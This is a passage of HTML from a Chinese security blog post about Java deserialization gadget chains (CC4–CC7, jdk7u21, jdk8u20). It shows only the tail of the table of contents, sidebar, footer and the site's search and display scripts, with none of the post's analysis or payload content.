class="toc-nav-number">1.3.3.1.</span> <span class="toc-nav-text">- 调用结构 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%88%86%E6%9E%90-4"><span class="toc-nav-number">1.3.3.2.</span> <span class="toc-nav-text">- 分析 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#payload-4"><span class="toc-nav-number">1.3.3.3.</span> <span class="toc-nav-text">- payload -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#CC4"><span class="toc-nav-number">1.3.4.</span> <span class="toc-nav-text">- CC4 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%B0%83%E7%94%A8%E7%BB%93%E6%9E%84-3"><span class="toc-nav-number">1.3.4.1.</span> <span class="toc-nav-text">- 调用结构 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%88%86%E6%9E%90-5"><span class="toc-nav-number">1.3.4.2.</span> <span class="toc-nav-text">- 分析 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#payload-5"><span class="toc-nav-number">1.3.4.3.</span> <span class="toc-nav-text">- payload -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E6%89%A9%E5%B1%95-1"><span class="toc-nav-number">1.3.4.4.</span> <span class="toc-nav-text">- 扩展 -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#CC5"><span class="toc-nav-number">1.3.5.</span> <span class="toc-nav-text">- CC5 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%B0%83%E7%94%A8%E7%BB%93%E6%9E%84-4"><span class="toc-nav-number">1.3.5.1.</span> <span class="toc-nav-text">- 调用结构 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%88%86%E6%9E%90-6"><span class="toc-nav-number">1.3.5.2.</span> <span class="toc-nav-text">- 分析 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#payload-6"><span class="toc-nav-number">1.3.5.3.</span> <span class="toc-nav-text">- payload -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#CC6"><span class="toc-nav-number">1.3.6.</span> <span class="toc-nav-text">- CC6 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%B0%83%E7%94%A8%E7%BB%93%E6%9E%84-5"><span class="toc-nav-number">1.3.6.1.</span> <span class="toc-nav-text">- 调用结构 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%88%86%E6%9E%90-7"><span class="toc-nav-number">1.3.6.2.</span> <span class="toc-nav-text">- 分析 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#payload-7"><span class="toc-nav-number">1.3.6.3.</span> <span class="toc-nav-text">- payload -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#CC7"><span class="toc-nav-number">1.3.7.</span> <span class="toc-nav-text">- CC7 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%B0%83%E7%94%A8%E7%BB%93%E6%9E%84-6"><span class="toc-nav-number">1.3.7.1.</span> <span class="toc-nav-text">- 调用结构 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%88%86%E6%9E%90-8"><span class="toc-nav-number">1.3.7.2.</span> <span class="toc-nav-text">- 分析 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#payload-8"><span class="toc-nav-number">1.3.7.3.</span> <span class="toc-nav-text">- payload -</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#jdk7u21"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">- jdk7u21 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E8%B0%83%E7%94%A8%E7%BB%93%E6%9E%84-7"><span class="toc-nav-number">1.4.1.</span> <span class="toc-nav-text">- 调用结构 -</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%88%86%E6%9E%90-9"><span class="toc-nav-number">1.4.2.</span> <span class="toc-nav-text">- 分析 -</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#payload-9"><span class="toc-nav-number">1.4.3.</span> <span class="toc-nav-text">- payload -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#jdk8u20"><span class="toc-nav-number">1.5.</span> <span class="toc-nav-text">- jdk8u20 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E8%B0%83%E7%94%A8%E7%BB%93%E6%9E%84-8"><span class="toc-nav-number">1.5.1.</span> <span class="toc-nav-text">- 调用结构 -</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%88%86%E6%9E%90-10"><span class="toc-nav-number">1.5.2.</span> <span class="toc-nav-text">- 分析 -</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#payload-10"><span class="toc-nav-number">1.5.3.</span> <span class="toc-nav-text">- payload -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-nav-number">1.6.</span> <span class="toc-nav-text">- 总结 -</span></a></li></ol></li></ol>
        
        </div>
      </aside>
    



      <!-- Sidebar Container -->
      <div class="
                col-lg-8 col-lg-offset-1
                col-md-10 col-md-offset-1
                sidebar-container">

        <!-- Featured Tags -->
        
        <section>
          <!-- no hr -->
          <h5>
            <a href="/tags/">标签</a>
          </h5>
          <div class="tags">
            
            <a class="tag" href="/tags/#安全" title="安全">安全</a>
            
            <a class="tag" href="/tags/#JAVA" title="JAVA">JAVA</a>
            
            <a class="tag" href="/tags/#漏洞" title="漏洞">漏洞</a>
            
            <a class="tag" href="/tags/#反序列化" title="反序列化">反序列化</a>
            
          </div>
        </section>
        

        <!-- Friends Blog -->
        
        <hr>
        <h5>朋友们</h5>
        <ul class="list-inline">

          
          <li>
            <a href="https://www.cnblogs.com/Yhck/" target="_blank">Yhck</a>
          </li>
          
          <li>
            <a href="https://www.cnblogs.com/wkzb/" target="_blank">beiwo</a>
          </li>
          
          <li>
            <a href="https://leohearts.com/" target="_blank">Leohearts</a>
          </li>
          
          <li>
            <a href="https://longlone.top/" target="_blank">Longlone</a>
          </li>
          
          <li>
            <a href="http://na0hblog.top/" target="_blank">Na0h</a>
          </li>
          
        </ul>
        
      </div>
    </div>
  </div>
</article>



<!-- anchorjs start -->
<!-- async load function -->
<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
<script type="text/javascript">
  // async load function
  function async (u, c) {
    var d = document,
      t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0];
    o.src = u;
    if (c) {
      o.addEventListener('load', function(e) {
        c(null, e);
      }, false);
    }
    s.parentNode.insertBefore(o, s);
  };
</script>
<script type="text/javascript">
  //anchor-js, Doc:http://bryanbraun.github.io/anchorjs/
  async ("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js", function() {
    anchors.options = {
      visible: 'hover',
      placement: 'left',
      // icon: 'ℬ'
      icon: '❡'
    };
    anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
  });
</script>
<style>
  /* place left on bigger screen */
  @media all and (min-width: 800px) {
    .anchorjs-link {
      position: absolute;
      left: -0.75em;
      font-size: 1.1em;
      margin-top: -0.1em;
    }
  }
</style>

<!-- anchorjs end -->



		<!-- Footer (contains ThemeColor、viewer) -->
		<!-- Footer -->
<footer>
  <div class="container">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <ul class="list-inline text-center">
          

          
            <li>
              <a target="_blank" href="https://github.com/Morouu">
                <span class="fa-stack fa-lg">
                  <i class="fa fa-circle fa-stack-2x"></i>
                  <i class="fa fa-github fa-stack-1x fa-inverse"></i>
                </span>
              </a>
            </li>
          

          

          

          

          

          

          

        </ul>
        <p class="copyright text-muted">
         &copy; 2022
		 <i class="icon-smile"></i>
          morouu
          <br>
          Theme by
          <a target="_blank" rel="noopener" href="http://beantech.org">BeanTech</a>
          <span style="display: inline-block; margin: 0 5px;">
            <i class="fa fa-heart"></i>
          </span>
          re-Ported by
          <a target="_blank" rel="noopener" href="https://v-vincen.life/">Live My Life</a>
          |
          <iframe style="margin-left: 2px; margin-bottom:-5px;" frameborder="0" scrolling="0" width="91px" height="20px" src="https://ghbtns.com/github-btn.html?user=V-Vincen&repo=V-Vincen.github.io&type=star&count=true"></iframe>
        <div class=" copyright text-muted live_time"><span>本博客已萌萌哒地运行</span><span id="display_live_time"> 0 天 0 小时 0 分 0 秒</span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
  setTimeout(blog_live_time, 1000);
  const start = new Date('2021-12-27T20:23:15');
  const now = new Date();
  const timeDiff = (now.getTime() - start.getTime());
  const msPerMinute = 60 * 1000;
  const msPerHour = 60 * msPerMinute;
  const msPerDay = 24 * msPerHour;
  const passDay = Math.floor(timeDiff / msPerDay);
  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
  display_live_time.innerHTML = " " + passDay + " 天 " + passHour + " 小时 " + passMinute + " 分 " + passSecond + " 秒";
}
blog_live_time();
</script></div>
		</p>
		
      </div>
    </div>
  </div>
</footer>

<a id="rocket" href="#top" class=""></a>


  <!-- jQuery -->
  <script type="text/javascript" src="/js/jquery.min.js"></script>
  <!-- Bootstrap Core JavaScript -->
  <script type="text/javascript" src="/js/bootstrap.min.js"></script>
  <!-- Custom Theme JavaScript -->
  <script type="text/javascript" src="/js/hux-blog.min.js"></script>
  <!-- catalog -->
  <script async="true" type="text/javascript" src="/js/catalog.js"></script>
  <!-- totop(rocket) -->
  <script async="true" type="text/javascript" src="/js/totop.js"></script>

  
    <!-- Busuanzi JavaScript -->
    <script async="async" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  

  
    <!-- Scroll start -->
    <script async="async" type="text/javascript" src="/js/scroll.js"></script>
    <!-- Scroll end -->
  

  
    <!-- LangSelect start -->
    <script type="text/javascript" src="/js/langselect.js"></script>
    <!-- LangSelect end -->
  

  
    <!-- Mouseclick -->
    <script type="text/javascript" src="/js/mouseclick.js" content='' color=''></script>
  

  
    <!-- ribbon -->
    <script type="text/javascript" src="/js/ribbonDynamic.js"></script>
  

  
    <!-- Line start -->
    <script async="text/javascript" src="/js/line.js"></script>
    <!-- Line end -->
  






  <!-- viewer start -->
  <!-- viewer start (Picture preview) -->
  
    <script async="async" type="text/javascript" src="/js/viewer/viewer.min.js"></script>
    <script async="async" type="text/javascript" src="/js/viewer/pic-viewer.js"></script>
  

  <!-- viewer end -->


<script>
  // async load function
  function async (u, c) {
    var d = document,
      t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0];
    o.src = u;
    if (c) {
      o.addEventListener('load', function (e) {
        c(null, e);
      }, false);
    }
    s.parentNode.insertBefore(o, s);
  }

  // fastClick.js
  async ("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function () {
    var $nav = document.querySelector("nav");
    if ($nav)
      FastClick.attach($nav);
    }
  )
</script>

<!-- Because of the native support for backtick-style fenced code blocks right within the Markdown is landed in Github Pages, From V1.6, There is no need for Highlight.js, so Huxblog drops it officially. -
https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0 - https://help.github.com/articles/creating-and-highlighting-code-blocks/ -->
<!-- <script> async ("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function () { hljs.initHighlightingOnLoad(); }) </script> <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet"> -->

<!-- jquery.tagcloud.js -->
<!-- <script> // only load tagcloud.js in tag.html if ($('#tag_cloud').length !== 0) { async ("https://morblog.cc/js/jquery.tagcloud.js", function () { $.fn.tagcloud.defaults = { // size: { start: 1, end: 1, unit: 'em' }, color: {
start: '#bbbbee', end: '#0085a1' } }; $('#tag_cloud a').tagcloud(); }) } </script> -->


		<!-- Search -->
		
		<div class="popup search-popup local-search-popup">
  <span class="popup-btn-close">
    ESC
  </span>
  <div class="container">
    <div class="row">
      <!-- <div class="col-md-9 col-md-offset-1"> -->
      <div class="col-lg-9 col-lg-offset-1 col-md-10 col-md-offset-1 local-search-content">

        <div class="local-search-header clearfix">

          <div class="local-search-input-wrapper">
            <span class="search-icon">
              <i class="fa fa-search fa-lg" style="margin: 25px 10px 25px 20px;"></i>
            </span>
            <input autocomplete="off" placeholder="搜索..." type="text" id="local-search-input">
          </div>
        </div>
        <div id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>


  
    <script src="/js/ziploader.js"></script>
  
  <script>
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.json";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    // monitor main search box;
    var onPopupClose = function (e) {
      $('.popup').fadeOut(300);
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $('.popup').fadeIn(300);
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }
    // get search zip version
    $.get('/searchVersion.json?t=' + (+new Date()), function (res) {
      if (localStorage.getItem('searchVersion') !== res) {
        localStorage.setItem('searchVersion', res);
        initSearchJson();
      }
    });

    function initSearchJson() {
      initLoad(['/search.flv'], {
        loadOptions: {
          success: function (obj) {
            localStorage.setItem('searchJson', obj['search.json'])
          },
          error: function (e) {
            return console.log(e)
          }
        },
        returnOptions: {
          'json': TYPE_TEXT
        },
        mimeOptions: {
          'json': 'application/json'
        }
      })
    }
    // search function;
    var searchFunc = function (search_id, content_id) {
      'use strict';
      isfetched = true;
      var datas = JSON.parse(localStorage.getItem('searchJson'));
      // console.log(search_id)
      var input = document.getElementById(search_id);
      var resultContent = document.getElementById(content_id);
      var inputEventFunction = function () {
        var searchText = input.value.trim().toLowerCase();
        var keywords = searchText.split(/[\s\-]+/);
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        var resultItems = [];
        if (searchText.length > 0) {
          // perform local searching
          datas.forEach(function (data) {
            var isMatch = false;
            var hitCount = 0;
            var searchTextCount = 0;
            var title = data.title
              ? data.title.trim()
              : '';
            var titleInLowerCase = title.toLowerCase();
            var content = data.content
              ? data.content.trim().replace(/<[^>]+>/g, "")
              : '';
            var contentInLowerCase = content.toLowerCase();
            var articleUrl = decodeURIComponent(data.url);

            var date = data.date;
            var dateTime = date.replace(/T/, " ").replace(/.000Z/, "");
            var imgUrl = data.header_img;
            


            var indexOfTitle = [];
            var indexOfContent = [];
            // only match articles with not empty titles
            keywords.forEach(function (keyword) {
              function getIndexByWord(word, text, caseSensitive) {
                var wordLen = word.length;
                if (wordLen === 0) {
                  return [];
                }
                var startPosition = 0,
                  position = [],
                  index = [];
                if (!caseSensitive) {
                  text = text.toLowerCase();
                  word = word.toLowerCase();
                }
                while ((position = text.indexOf(word, startPosition)) > -1) {
                  index.push({position: position, word: word});
                  startPosition = position + wordLen;
                }
                return index;
              }
              indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
              indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
            });
            if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
              isMatch = true;
              hitCount = indexOfTitle.length + indexOfContent.length;
            }
            // show search results
            if (isMatch) {
              // sort index by position of keyword
              [indexOfTitle, indexOfContent].forEach(function (index) {
                index.sort(function (itemLeft, itemRight) {
                  if (itemRight.position !== itemLeft.position) {
                    return itemRight.position - itemLeft.position;
                  } else {
                    return itemLeft.word.length - itemRight.word.length;
                  }
                });
              });
              // merge hits into slices
              function mergeIntoSlice(text, start, end, index) {
                var item = index[index.length - 1];
                var position = item.position;
                var word = item.word;
                var hits = [];
                var searchTextCountInSlice = 0;
                while (position + word.length <= end && index.length != 0) {
                  if (word === searchText) {
                    searchTextCountInSlice++;
                  }
                  hits.push({position: position, length: word.length});
                  var wordEnd = position + word.length;
                  // move to next position of hit
                  index.pop();
                  while (index.length != 0) {
                    item = index[index.length - 1];
                    position = item.position;
                    word = item.word;
                    if (wordEnd > position) {
                      index.pop();
                    } else {
                      break;
                    }
                  }
                }
                searchTextCount += searchTextCountInSlice;
                return {hits: hits, start: start, end: end, searchTextCount: searchTextCountInSlice};
              }
              var slicesOfTitle = [];
              if (indexOfTitle.length != 0) {
                slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
              }
              var slicesOfContent = [];
              while (indexOfContent.length != 0) {
                var item = indexOfContent[indexOfContent.length - 1];
                var position = item.position;
                var word = item.word;
                // cut out 100 characters
                var start = position - 20;
                var end = position + 80;
                if (start < 0) {
                  start = 0;
                }
                if (end < position + word.length) {
                  end = position + word.length;
                }
                if (end > content.length) {
                  end = content.length;
                }
                slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
              }
              // sort slices in content by search text's count and hits' count
              slicesOfContent.sort(function (sliceLeft, sliceRight) {
                if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                  return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                  return sliceRight.hits.length - sliceLeft.hits.length;
                } else {
                  return sliceLeft.start - sliceRight.start;
                }
              });
              // select top N slices in content
              var upperBound = parseInt('1');
              if (upperBound >= 0) {
                slicesOfContent = slicesOfContent.slice(0, upperBound);
              }
              // highlight title and content
              function highlightKeyword(text, slice) {
                var result = '';
                var prevEnd = slice.start;
                slice.hits.forEach(function (hit) {
                  result += text.substring(prevEnd, hit.position);
                  var end = hit.position + hit.length;
                  result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                  prevEnd = end;
                });
                result += text.substring(prevEnd, slice.end);
                return result;
              }
              var resultItem = '';

              // if (slicesOfTitle.length != 0) {   resultItem += "<li><a target='_blank' href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>"; } else {   resultItem += "<li><a target='_blank' href='" +
              // articleUrl + "' class='search-result-title'>" + title + "</a>"; } slicesOfContent.forEach(function (slice) {   resultItem += "<a target='_blank' href='" + articleUrl + "'><p class=\"search-result\">" + highlightKeyword(content, slice) +
              // "...</p></a>"; }); resultItem += "</li>";

              if (slicesOfTitle.length != 0) {
                resultItem += "<a target='_blank' href='" + articleUrl + "' class='search-result'><div class='search-result-left'><div class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</div><time class='search-result-date'>" + dateTime + "</time>";
              } else {
                resultItem += "<a target='_blank' href='" + articleUrl + "' class='search-result'><div class='search-result-left'><div class='search-result-title'>" + title + "</div><time class='search-result-date'>" + dateTime + "</time>";
              }
              slicesOfContent.forEach(function (slice) {
                resultItem += "<p class=\"search-result-content\">" + highlightKeyword(content, slice) + "...</p>";
              });
              resultItem += "</div><div class='search-result-right'><img class='media-image' src='" + imgUrl + "' width='64px' height='48px'></img></div></a>";

              resultItems.push({item: resultItem, searchTextCount: searchTextCount, hitCount: hitCount, id: resultItems.length});
            }
          })
        };

        if (keywords.length === 1 && keywords[0] === "") {
          resultContent.innerHTML = '<div id="no-result"></div>'
        } else if (resultItems.length === 0) {
          resultContent.innerHTML = '<div id="no-result"></div>'
        } else {
          resultItems.sort(function (resultLeft, resultRight) {
            if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
              return resultRight.searchTextCount - resultLeft.searchTextCount;
            } else if (resultLeft.hitCount !== resultRight.hitCount) {
              return resultRight.hitCount - resultLeft.hitCount;
            } else {
              return resultRight.id - resultLeft.id;
            }
          });
          var searchResultList = '<div class=\"search-result-list\">';
          resultItems.forEach(function (result) {
            searchResultList += result.item;
          })
          searchResultList += "</div>";
          resultContent.innerHTML = searchResultList;
        }
      }
      if ('auto' === 'auto') {
        input.addEventListener('input', inputEventFunction);
      } else {
        $('.search-icon').click(inputEventFunction);
        input.addEventListener('keypress', function (event) {
          if (event.keyCode === 13) {
            inputEventFunction();
          }
        });
      }
      // remove loading animation
      $('body').css('overflow', '');
      proceedsearch();
    }
    // handle and trigger popup window;
    $('.popup-trigger').click(function (e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc('local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });
    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function (e) {
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 && $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });

    document.addEventListener('mouseup', (e) => {
      var _con = document.querySelector(".local-search-content");
      if (_con) {
        if (!_con.contains(e.target)) {
          onPopupClose();
        }
      }
    });
  </script>


		
	<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/haru02.model.json"},"display":{"position":"right","width":225,"height":225,"right":125},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
